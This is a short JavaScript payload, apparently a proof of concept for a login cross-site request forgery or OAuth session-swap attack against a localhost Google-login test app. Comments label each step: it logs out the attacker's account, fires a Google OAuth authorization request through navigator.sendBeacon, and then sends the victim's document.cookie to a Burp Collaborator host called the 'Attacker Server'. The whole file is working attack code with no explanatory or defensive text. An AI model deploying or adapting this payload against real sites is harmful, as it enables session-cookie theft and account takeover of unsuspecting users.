//Uploaded on Server

//Logout Attacker's Account
navigator.sendBeacon("http://localhost/GoogleLogin/logout.php","");

//Login to Victim's Account using oAuth Login
navigator.sendBeacon("https://accounts.google.com/o/oauth2/auth?response_type=code&access_type=online&client_id=3195217987-usqr8lj019fd8df2rlihu32gl3qk725r.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%2FGoogleLogin%2Fg-callback.php&state&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fplus.login%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email&approval_prompt=auto","");

//Send cookie to Attacker Server
var link="http://1ikiw1crd47mtags9djf1fuhu80yon.burpcollaborator.net/VictimCookies="+document.cookie;
navigator.sendBeacon(link,"");